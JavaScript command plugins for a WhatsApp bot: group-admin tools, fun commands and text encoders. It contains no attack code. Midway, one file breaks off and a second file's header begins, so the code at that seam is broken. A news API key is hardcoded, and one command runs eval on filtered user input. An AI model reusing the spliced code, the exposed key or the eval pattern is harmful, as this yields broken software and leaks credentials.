  aliases: ["resetlink", "newlink"],
  desc: "Revoke the group invite link",
  categorie: "group",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Revoke the group link
    await hn.groupRevokeInvite(dest.chat);
    
    repondre("✅ Group invite link has been revoked. Use .grouplink to get the new link.");
  } catch (error) {
    console.error("Error in revoke command:", error);
    repondre("❌ An error occurred while revoking the group link.");
  }
});

hango({
  nomCom: "grouplink",
  aliases: ["getlink", "invitelink"],
  desc: "Get the group invite link",
  categorie: "group",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get the group invite link
    const code = await hn.groupInviteCode(dest.chat);
    const link = `https://chat.whatsapp.com/${code}`;
    
    repondre(`🔗 *Group Invite Link*\n\n${link}`);
  } catch (error) {
    console.error("Error in grouplink command:", error);
    repondre("❌ An error occurred while getting the group link.");
  }
});

hango({
  nomCom: "antibot",
  aliases: ["nobot", "antibots"],
  desc: "Toggle anti-bot feature in the group",
  categorie: "group",
  reaction: '🤖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Toggle antibot mode
    const status = arg[0]?.toLowerCase();
    
    if (!status || !['on', 'off'].includes(status)) {
      return repondre("❌ Please specify whether to turn antibot on or off. Example: .antibot on");
    }
    
    // In a full implementation, you would save this setting to a database
    // This is a placeholder implementation
    if (status === 'on') {
      // Enable antibot
      repondre("✅ Anti-bot feature has been *enabled*. Other bots will be removed when detected.");
    } else {
      // Disable antibot
      repondre("✅ Anti-bot feature has been *disabled*. Other bots are now allowed.");
    }
  } catch (error) {
    console.error("Error in antibot command:", error);
    repondre("❌ An error occurred while toggling the anti-bot feature.");
  }
});

hango({
  nomCom: "mute",
  aliases: ["mutegroup", "silence"],
  desc: "Mute the group for non-admins",
  categorie: "group",
  reaction: '🔇',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to admins-only mode
    await hn.groupSettingUpdate(dest.chat, 'announcement');
    
    repondre("🔇 Group has been *muted*. Only admins can send messages now.");
  } catch (error) {
    console.error("Error in mute command:", error);
    repondre("❌ An error occurred while muting the group.");
  }
});

hango({
  nomCom: "unmute",
  aliases: ["unmutegroup", "unsilence"],
  desc: "Unmute the group for all members",
  categorie: "group",
  reaction: '🔊',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Set group to everyone mode
    await hn.groupSettingUpdate(dest.chat, 'not_announcement');
    
    repondre("🔊 Group has been *unmuted*. All members can send messages now.");
  } catch (error) {
    console.error("Error in unmute command:", error);
    repondre("❌ An error occurred while unmuting the group.");
  }
});

hango({
  nomCom: "admins",
  aliases: ["adminlist", "listadmins"],
  desc: "List all admins in the group",
  categorie: "group",
  reaction: '👑',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const admins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    
    if (admins.length === 0) {
      return repondre("❓ Strange, no admins found in this group.");
    }
    
    // Create admin list with mentions
    let message = `👑 *ADMIN LIST*\n\n`;
    
    admins.forEach((admin, i) => {
      message += `${i + 1}. @${admin.id.split('@')[0]}\n`;
    });
    
    const mentions = admins.map(a => a.id);
    
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in admins command:", error);
    repondre("❌ An error occurred while listing the admins.");
  }
});

hango({
  nomCom: "add",
  aliases: ["invite", "addmember"],
  desc: "Add a person to the group",
  categorie: "group",
  reaction: '➕',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if number is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the phone number to add. Example: .add 1234567890");
    }
    
    let number = arg[0].replace(/[^0-9]/g, '');
    
    // Add country code if not present
    if (number.length <= 11) {
      number = '91' + number; // Assuming 91 for India, modify for your region
    }
    
    // Ensure number has @ format
    if (!number.includes('@')) {
      number = number + '@s.whatsapp.net';
    }
    
    // Add the member
    const response = await hn.groupParticipantsUpdate(dest.chat, [number], "add");
    
    if (response[0].status === "409") {
      return repondre("❌ The person is already in the group.");
    } else if (response[0].status === "403") {
      return repondre("❌ Failed to add. The person might have their privacy settings restricted.");
    } else if (response[0].status === "408") {
      return repondre("❌ Failed to add. The person might have left the group recently.");
    } else if (response[0].status === "200") {
      return repondre("✅ Successfully added to the group!");
    } else {
      return repondre("❌ Failed to add the person. Status: " + response[0].status);
    }
  } catch (error) {
    console.error("Error in add command:", error);
    repondre("❌ An error occurred while adding the member.");
  }
});

hango({
  nomCom: "groupdp",
  aliases: ["setdp", "groupicon"],
  desc: "Change the group profile picture",
  categorie: "group",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if an image is quoted
    if (!dest.quoted || !dest.quoted.image) {
      return repondre("❌ Please reply to an image to set as group icon.");
    }
    
    // Download the image
    const media = await dest.quoted.download();
    
    // Set as group icon
    await hn.updateProfilePicture(dest.chat, media);
    
    repondre("✅ Group icon has been updated successfully!");
  } catch (error) {
    console.error("Error in groupdp command:", error);
    repondre("❌ An error occurred while changing the group icon.");
  }
});

hango({
  nomCom: "hidetag",
  aliases: ["htag", "secretmention"],
  desc: "Mention everyone without showing tag list",
  categorie: "group",
  reaction: '👥',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Get message to announce (if any)
    const message = arg.join(" ") || "Important announcement!";
    
    // Get all members for mentions
    const mentions = groupMetadata.participants.map(p => p.id);
    
    // Send message with hidden tags
    await hn.sendMessage(dest.chat, {
      text: message,
      mentions: mentions
    });
  } catch (error) {
    console.error("Error in hidetag command:", error);
    repondre("❌ An error occurred while sending the hidden tag message.");
  }
});

hango({
  nomCom: "leave",
  aliases: ["leavegroup", "botleave"],
  desc: "Make the bot leave the group",
  categorie: "group",
  reaction: '👋',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin or bot owner
    const isOwner = dest.sender === conf.owner;
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin && !isOwner) {
      return repondre("❌ Only group admins or the bot owner can use this command.");
    }
    
    // Send goodbye message
    await repondre("👋 It was nice being here. Goodbye everyone!");
    
    // Leave the group after a short delay
    setTimeout(async () => {
      await hn.groupLeave(dest.chat);
    }, 1000);
  } catch (error) {
    console.error("Error in leave command:", error);
    repondre("❌ An error occurred while leaving the group.");
  }
});

hango({
  nomCom: "announce",
  aliases: ["announcement", "broadcast"],
  desc: "Send a formatted announcement to the group",
  categorie: "group",
  reaction: '📢',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("❌ This command can only be used in a group chat.");
    }
    
    // Check if user is admin
    const groupMetadata = await hn.groupMetadata(dest.chat);
    const isAdmin = groupMetadata.participants.find(p => p.id === dest.sender && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    if (!isAdmin) {
      return repondre("❌ Only group admins can use this command.");
    }
    
    // Check if announcement text is provided
    if (arg.length === 0) {
      return repondre("❌ Please provide the announcement text.");
    }
    
    const announcement = arg.join(" ");
    
    // Format the announcement
    const formattedAnnouncement = `
━━━━━━━━━━━━━━━
📢 *GROUP ANNOUNCEMENT*
━━━━━━━━━━━━━━━

${announcement}

━━━━━━━━━━━━━━━
From: @${dest.sender.split('@')[0]}
Date: ${new Date().toLocaleDateString()}
Time: ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━
    `;
    
    // Send announcement
    await hn.sendMessage(dest.chat, {
      text: formattedAnnouncement,
      mentions: [dest.sender]
    });
  } catch (error) {
    console.error("Error in announce command:", error);
    repondre("❌ An error occurred while sending the announcement.");
  }
});

hango({
  nomCom: "meme",
  aliases: ["randommeme", "funmeme"],
  desc: "Get a random meme from Reddit",
  categorie: "fun",
  reaction: '😂',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Fetch random meme from Reddit
    const response = await axios.get('https://meme-api.com/gimme');
    const { url, title, subreddit } = response.data;
    
    // Send the meme with caption
    await hn.sendMessage(dest.chat, {
      image: { url: url },
      caption: `😂 *${title}*\n\nSource: r/${subreddit}`
    });
  } catch (error) {
    console.error("Error in meme command:", error);
    await repondre("❌ An error occurred while fetching a meme.");
  }
});

hango({
  nomCom: "ascii",
  aliases: ["asciiart", "textart"],
  desc: "Convert text to ASCII art",
  categorie: "fun",
  reaction: '🎨',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to ASCII art.");
    }
    
    // Use figlet API for ASCII art conversion
    const response = await axios.get(`https://api.xteam.xyz/figlet?text=${encodeURIComponent(text)}`);
    const asciiArt = response.data.result;
    
    // Send ASCII art as monospace text
    await repondre("```" + asciiArt + "```");
  } catch (error) {
    console.error("Error in ascii command:", error);
    await repondre("❌ An error occurred while creating ASCII art. Try a shorter text.");
  }
});

hango({
  nomCom: "reverse",
  aliases: ["reversetext", "backward"],
  desc: "Reverse the given text",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to reverse.");
    }
    
    // Reverse the text
    const reversedText = text.split("").reverse().join("");
    
    await repondre(`🔄 *Original:* ${text}\n\n*Reversed:* ${reversedText}`);
  } catch (error) {
    console.error("Error in reverse command:", error);
    await repondre("❌ An error occurred while reversing the text.");
  }
});

hango({
  nomCom: "zalgo",
  aliases: ["creepytext", "corrupted"],
  desc: "Convert text to zalgo (glitchy) format",
  categorie: "fun",
  reaction: '👹',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to zalgo format.");
    }
    
    // Function to add zalgo characters
    const zalgoify = (text) => {
      const zalgoMarks = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305',
        '\u0306', '\u0307', '\u0308', '\u0309', '\u030A', '\u030B',
        '\u030C', '\u030D', '\u030E', '\u030F', '\u0310', '\u0311'
      ];
      
      let result = '';
      for (const char of text) {
        result += char;
        // Add 2-5 random zalgo marks to each character
        const numMarks = Math.floor(Math.random() * 4) + 2;
        for (let i = 0; i < numMarks; i++) {
          const markIndex = Math.floor(Math.random() * zalgoMarks.length);
          result += zalgoMarks[markIndex];
        }
      }
      return result;
    };
    
    const zalgoText = zalgoify(text);
    
    await repondre(`👹 *Z̷͏a̷͏l̷͏g̷͏o̷͏ Text:*\n\n${zalgoText}`);
  } catch (error) {
    console.error("Error in zalgo command:", error);
    await repondre("❌ An error occurred while creating zalgo text.");
  }
});

hango({
  nomCom: "mock",
  aliases: ["mocktext", "sarcasm"],
  desc: "Convert text to mOcKiNg SpOnGeBoB format",
  categorie: "fun",
  reaction: '🥴',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to mocking format.");
    }
    
    // Convert to mocking text (alternating caps)
    let mockText = '';
    for (let i = 0; i < text.length; i++) {
      mockText += i % 2 === 0 ? text[i].toLowerCase() : text[i].toUpperCase();
    }
    
    await repondre(`🥴 *MoCkInG TeXt:*\n\n${mockText}`);
  } catch (error) {
    console.error("Error in mock command:", error);
    await repondre("❌ An error occurred while creating mocking text.");
  }
});

hango({
  nomCom: "hex",
  aliases: ["tohex", "hexconvert"],
  desc: "Convert text to hexadecimal",
  categorie: "conversion",
  reaction: '🔣',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to hexadecimal.");
    }
    
    // Convert text to hex
    const hexText = Buffer.from(text).toString('hex');
    
    await repondre(`🔣 *Hexadecimal:*\n\n${hexText}`);
  } catch (error) {
    console.error("Error in hex command:", error);
    await repondre("❌ An error occurred while converting to hexadecimal.");
  }
});

hango({
  nomCom: "unhex",
  aliases: ["fromhex", "hexdecode"],
  desc: "Convert hexadecimal to text",
  categorie: "conversion",
  reaction: '🔤',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const hex = arg.join(" ");
    
    if (!hex) {
      return repondre("❌ Please provide hexadecimal to convert to text.");
    }
    
    if (!/^[0-9A-Fa-f]+$/.test(hex)) {
      return repondre("❌ Invalid hexadecimal. Please provide valid hex characters (0-9, A-F).");
    }
    
    // Convert hex to text
    const text = Buffer.from(hex, 'hex').toString('utf-8');
    
    await repondre(`🔤 *Decoded Text:*\n\n${text}`);
  } catch (error) {
    console.error("Error in unhex command:", error);
    await repondre("❌ An error occurred while converting from hexadecimal.");
  }
});

hango({
  nomCom: "morse",
  aliases: ["tomorse", "morsecode"],
  desc: "Convert text to Morse code",
  categorie: "conversion",
  reaction: '📶',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const text = arg.join(" ");
    
    if (!text) {
      return repondre("❌ Please provide text to convert to Morse code.");
    }
    
    // Morse code mapping
    const morseMap = {
      'a': '.-',
      'b': '-...',
      'c': '-.-.',
      'd': '-..',
      'e': '.',
      'f': '..-.',
      'g': '--.',
      'h': '....',
      'i': '..',
      'j': '.---',
      'k': '-.-',
      'l': '.-..',
      'm': '--',
      'n': '-.',
      'o': '---',
      'p': '.--.',
      'q': '--.-',
      'r': '.-.',
      's': '...',
      't': '-',
      'u': '..-',
      'v': '...-',
      'w': '.--',
      'x': '-..-',
      'y': '-.--',
      'z': '--..',
      '0': '-----',
      '1': '.----',
      '2': '..---',
      '3': '...--',
      '4': '....-',
      '5': '.....',
      '6': '-....',
      '7': '--...',
      '8': '---..',
      '9': '----.',
      '.': '.-.-.-',
      ',': '--..--',
      '?': '..--..',
      "'": '.----.',
      '!': '-.-.--',
      '/': '-..-.',
      '(': '-.--.',
      ')': '-.--.-',
      '&': '.-...',
      ':': '---...',
      ';': '-.-.-.',
      '=': '-...-',
      '+': '.-.-.',
      '-': '-....-',
      '_': '..--.-',
      '"': '.-..-.',
      '$': '...-..-',
      '@': '.--.-.',
      ' ': '/'
    };
    
    // Convert text to Morse code
    const morseCode = text.toLowerCase().split('').map(char => morseMap[char] || '').join(' ');
    
    await repondre(`📶 *Morse Code:*\n\n${morseCode}`);
  } catch (error) {
    console.error("Error in morse command:", error);
    await repondre("❌ An error occurred while converting to Morse code.");
  }
});

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
    repondre("❌ An error occurred while decoding the URL encoded text.");
  }
});

hango({
  nomCom: "dice",
  aliases: ["rolldice", "diceroll", "roll"],
  desc: "Roll a dice (1-6).",
  categorie: "fun",
  reaction: '🎲',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Roll a dice (generate a random number between 1 and 6)
    const result = Math.floor(Math.random() * 6) + 1;
    
    // Send the result
    repondre(`🎲 You rolled: *${result}*`);
  } catch (e) {
    console.error("Error in .roll command:", e);
    repondre("❌ An error occurred while rolling the dice.");
  }
});

hango({
  nomCom: "coinflip",
  aliases: ["flipcoin", "coinflip"],
  desc: "Flip a coin and get Heads or Tails.",
  categorie: "fun",
  reaction: '🪙',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Simulate coin flip (randomly choose Heads or Tails)
    const result = Math.random() < 0.5 ? "Heads" : "Tails";
    
    // Send the result
    repondre(`🪙 Coin Flip Result: *${result}*`);
  } catch (e) {
    console.error("Error in .coinflip command:", e);
    repondre("❌ An error occurred while flipping the coin.");
  }
});

hango({
  nomCom: "flip",
  aliases: ["fliptext", "textflip"],
  desc: "Flip the text you provide.",
  categorie: "fun",
  reaction: '🔄',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to flip.");
  }

  try {
    // Flip the text
    const flippedText = text.split('').reverse().join('');
    
    // Send the flipped text
    repondre(`🔄 Flipped Text: *${flippedText}*`);
  } catch (e) {
    console.error("Error in .flip command:", e);
    repondre("❌ An error occurred while flipping the text.");
  }
});

hango({
  nomCom: "pick",
  aliases: ["choose", "select"],
  desc: "Pick between two choices.",
  categorie: "fun",
  reaction: '🚚',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure two options are provided
  if (!text.includes(',')) {
    return repondre("❌ Please provide two choices to pick from. Example: `.pick Ice Cream, Pizza`");
  }

  try {
    // Pick a random option
    const options = text.split(',').map(option => option.trim());
    const choice = options[Math.floor(Math.random() * options.length)];

    // Send the result
    repondre(`🎉 Bot picks: *${choice}*`);
  } catch (e) {
    console.error("Error in .pick command:", e);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "timenow",
  aliases: ["currenttime", "time"],
  desc: "Check the current local time.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time in the configured timezone
    const localTime = now.toLocaleTimeString("en-US", { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true,
      timeZone: conf.TIMEZONE, // Using the configured timezone from set.js
    });
    
    // Send the local time as reply
    repondre(`🕒 Current Local Time: ${localTime}`);
  } catch (e) {
    console.error("Error in .timenow command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "date",
  aliases: ["currentdate", "todaydate"],
  desc: "Check the current date.",
  categorie: "new",
  reaction: '📆',
}, async (dest, hn, context) => {
  const { repondre } = context;

  try {
    // Get current date
    const now = new Date();
    
    // Get the formatted date (e.g., "Monday, January 15, 2025")
    const currentDate = now.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric"
    });
    
    // Send the current date as reply
    repondre(`📅 Current Date: ${currentDate}`);
  } catch (e) {
    console.error("Error in .date command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "calculate2",
  aliases: ["calcu", "maths", "mathema"],
  desc: "Evaluate a mathematical expression.",
  categorie: "new",
  reaction: '🧮',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // Ensure arguments are provided
  if (!text) {
    return repondre("🧮 Use this command like:\n *Example:* .calculate 5+3*2");
  }

  // Validate the input to prevent unsafe operations
  if (!/^[0-9+\-*/().\s]+$/.test(text)) {
    return repondre("❎ Invalid expression. Only numbers and +, -, *, /, ( ) are allowed.");
  }

  try {
    // Evaluate the mathematical expression
    let result = eval(text);

    // Reply with the result
    repondre(`✅ Result of "${text}" is: ${result}`);
  } catch (e) {
    console.error("Error in .calculate command:", e);
    repondre("❎ Error in calculation. Please check your expression.");
  }
});

hango({
  nomCom: "emojify",
  aliases: ["emoji", "txtemoji"],
  desc: "Convert text into emoji form.",
  categorie: "fun",
  reaction: '🙂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  // If no valid text is provided
  if (!text) {
    return repondre("❌ Please provide some text to convert into emojis!");
  }

  try {
    // Map text to corresponding emoji characters
    const emojiMapping = {
      "a": "🅰️",
      "b": "🅱️",
      "c": "🇨️",
      "d": "🇩️",
      "e": "🇪️",
      "f": "🇫️",
      "g": "🇬️",
      "h": "🇭️",
      "i": "🇮️",
      "j": "🇯️",
      "k": "🇰️",
      "l": "🇱️",
      "m": "🇲️",
      "n": "🇳️",
      "o": "🅾️",
      "p": "🇵️",
      "q": "🇶️",
      "r": "🇷️",
      "s": "🇸️",
      "t": "🇹️",
      "u": "🇺️",
      "v": "🇻️",
      "w": "🇼️",
      "x": "🇽️",
      "y": "🇾️",
      "z": "🇿️",
      "0": "0️⃣",
      "1": "1️⃣",
      "2": "2️⃣",
      "3": "3️⃣",
      "4": "4️⃣",
      "5": "5️⃣",
      "6": "6️⃣",
      "7": "7️⃣",
      "8": "8️⃣",
      "9": "9️⃣",
      " ": "␣" // for space
    };

    // Convert the input text into emoji form
    const emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

    await hn.sendMessage(dest, {
      text: emojiText,
    }, { quoted: context.ms });

  } catch (e) {
    console.error("Error in .emoji command:", e);
    repondre(`❌ Error: ${e.message}`);
  }
});

hango({
  nomCom: "news2",
  aliases: ["latestnews", "newsheadlines"],
  desc: "Get the latest news headlines.",
  categorie: "AI",
  reaction: '🗞️',
}, async (dest, hn, context) => {
  const { repondre, from } = context;

  try {
    const apiKey = "0f2c43ab11324578a7b1709651736382";
    const response = await axios.get(`https://newsapi.org/v2/top-headlines?country=us&apiKey=${apiKey}`);
    const articles = response.data.articles;

    if (!articles.length) {
      return repondre("No news articles found.");
    }

    // Send each article as a separate message with image and title
    for (let i = 0; i < Math.min(articles.length, 5); i++) {
      const article = articles[i];
      let message = `
📰 *${article.title}*
📝 _${article.description}_
🔗 _${article.url}_

